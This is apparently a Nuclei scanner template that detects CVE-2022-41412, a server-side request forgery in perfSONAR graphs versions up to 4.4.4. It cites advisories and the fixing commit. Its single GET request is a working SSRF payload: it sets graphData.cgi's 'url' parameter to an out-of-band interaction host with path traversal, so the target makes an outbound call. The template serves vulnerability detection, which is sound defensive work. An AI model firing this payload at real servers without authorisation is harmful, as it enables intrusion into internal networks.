id: CVE-2022-41412

info:
  name: SSRF via perfSONAR > 4.x <= 4.4.4
  author: null_hypothesis
  severity: high
  reference:
    - https://github.com/renmizo/CVE-2022-41412
    - https://hackerone.com/reports/2445802
    - https://github.com/perfsonar/graphs/commit/463e1d9dc30782d9b1c002143551ec78b74e03bb
    - https://www.perfsonar.net/releasenotes-2022-09-20-4-4-5.html
  metadata:
    max-request: 1
  tags: ssrf, perfsonar, cve2022

http:
  - method: GET
    path:
      - "{{BaseURL}}/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://{{interactsh-url}}/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4"

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"
